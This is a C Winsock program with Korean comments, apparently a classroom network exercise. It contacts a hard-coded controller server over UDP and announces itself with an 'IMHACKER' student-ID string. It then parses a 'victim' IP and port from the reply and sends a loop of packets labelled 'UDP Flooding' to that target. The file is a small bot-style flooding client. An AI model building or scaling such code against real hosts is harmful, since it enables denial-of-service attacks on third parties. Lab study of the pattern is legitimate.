#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#define BUFSIZE 512
#include <winsock2.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#pragma comment(lib, "ws2_32.lib")

///err_msg(): 소켓 함수 실행 중 오류가 발생했을 때 오류 메시지를 출력 후 종료하는 함수
void err_msg(const char* msg, bool option) {
    LPVOID lpMsgBuf;
    FormatMessage(
        FORMAT_MESSAGE_ALLOCATE_BUFFER |
        FORMAT_MESSAGE_FROM_SYSTEM,
        NULL, WSAGetLastError(),
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPTSTR)&lpMsgBuf, 0, NULL);
    if (option) {
        MessageBox(NULL, (LPCTSTR)lpMsgBuf, (LPCTSTR)msg, MB_ICONERROR);
        LocalFree(lpMsgBuf);
        exit(-1);
    }
    else {
        printf("[%s] %s", msg, (LPCTSTR)lpMsgBuf);
        LocalFree(lpMsgBuf);
    }
}

//메인 함수 시작
int main(int argc, char* argv[]) {

    int retval; //소켓 프로그래밍 중 데이터 통신을 담당할 변수

    //WSAStartup(): 윈속 wsa를 초기화
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return -1;
    }

    // socket(): UDP 소켓 생성
    SOCKET sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock == INVALID_SOCKET) { //에러 메시지 출력
        err_msg("socket()", TRUE);
    }

    //server 주소 구조체 초기화
    SOCKADDR_IN serverAddr;
    ZeroMemory(&serverAddr, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET; //주소 체계, IPv4
    serverAddr.sin_port = htons(10004); //포트 번호 
    serverAddr.sin_addr.s_addr = inet_addr("114.70.37.17"); //IP 주소
    serverAddr.sin_zero;


    // 데이터 통신에 사용할 변수들
    SOCKADDR_IN clientAddr; //client 구조체
    int clientSize; //client 구조체 주소 변수
    char Sbuf[BUFSIZE + 1] = "IMHACKER_2018111312"; //buffer for server
    char Vbuf[BUFSIZE + 1] = "2018111312"; //buffer for victim

    //server와 통신 시작
    // send data
    retval = sendto(sock, Sbuf, strlen(Sbuf), 0, (SOCKADDR*)&serverAddr, sizeof(serverAddr));
    //소켓의 fd, 전송될 데이터를 가진 버퍼 W포인터, 버퍼 길이, 함수 호출 후 할 일을 명시하는 플래그, 수신 호스트 주소, 주소 정보 구조체 길이

    if (retval == SOCKET_ERROR) { //에러 메시지 출력
        err_msg("sendto()", FALSE);
    }

    // recieve data
    clientSize = sizeof(clientAddr); //client 주소 정보 구조체의 길이
    retval = recvfrom(sock, Sbuf, BUFSIZE, 0, (SOCKADDR*)&clientAddr, &clientSize);
    //바인드된 소켓의 fd, 수신되는 데이터 저장할 버퍼 포인터, 버퍼 길이, 함수 호출해서 뭐 할건지 명시하는 플래그, 송신 호스트 주소, 주소 정보 구조체 길이

    if (retval == SOCKET_ERROR) { //에러 메시지 출력
        err_msg("recvfrom()", FALSE);
    }

    // IP주소 비교를 통한 client IP주소 체크, if문 조건 충족 시 에러 메시지 출력
    if (memcmp(&clientAddr, &serverAddr, sizeof(clientAddr))) {
        printf("error: 잘못된 데이터\n");
    }

    // 받은 데이터 출력    
    Sbuf[retval] = '\0'; // 서버측 버퍼에 널문자 붙여주기
    printf("[received] %s\n", Sbuf); //서버가 보내 온 정보 출력 - OKAY_IP:PORT

    //받은 데이터에서 IP, PORT 정보 분리
    char* ptr = strtok(Sbuf, "_");//ptr = OKAY

    ptr = strtok(NULL, ":");//':'를 구분자로 분리
    char* victimAddr = ptr; //vicAddr = victom's IP

    ptr = strtok(NULL, "");//마지막 PORT 번호 분리
    char* victimPort = ptr; //victim's PORT(char)
    int intvicPort = atoi(ptr);//trans PORT char -> int

    //victim 주소 구조체 초기화
    SOCKADDR_IN vicAddr;
    ZeroMemory(&vicAddr, sizeof(victimAddr));
    vicAddr.sin_family = AF_INET; //주소 체계, IPv4
    vicAddr.sin_addr.s_addr = inet_addr(victimAddr); //IP 주소
    vicAddr.sin_port = htons(intvicPort); //포트 번호 
    vicAddr.sin_zero;

    //UDP Flooding

    for (int i = 0; i < 10; i++) { //행위 10번 반복
        retval = sendto(sock, Vbuf, strlen(Vbuf), 0, (SOCKADDR*)&vicAddr, sizeof(vicAddr));

        if (retval == SOCKET_ERROR) { //에러 메시지 출력
            err_msg("sendto()", FALSE);
            continue;
        }
    }

    // closesocket(): 소켓 연결 해제
    closesocket(sock);

    //윈속 종료
    WSACleanup();
    return 0;
}
